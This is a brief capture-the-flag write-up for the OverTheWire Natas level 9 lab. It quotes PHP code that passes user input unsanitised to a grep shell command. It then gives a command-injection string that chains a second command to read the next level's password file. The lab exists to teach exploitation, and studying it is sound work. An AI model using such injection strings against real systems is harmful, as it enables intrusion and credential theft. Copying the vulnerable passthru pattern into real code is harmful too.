# Level 9

URL : http://natas9.natas.labs.overthewire.org



## Solution

we have the source code : 

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

## What ca we exploit ?

we can manipulate the input for the **`grep command`**, we know that the password for natas10 is in /etc/natas_webpass/natas10.  
since we control the input, we can do this:

we can input the following string : **|| cat /etc/natas_webpass/natas10 &&**

That's all! {Basic c0mand Injection}
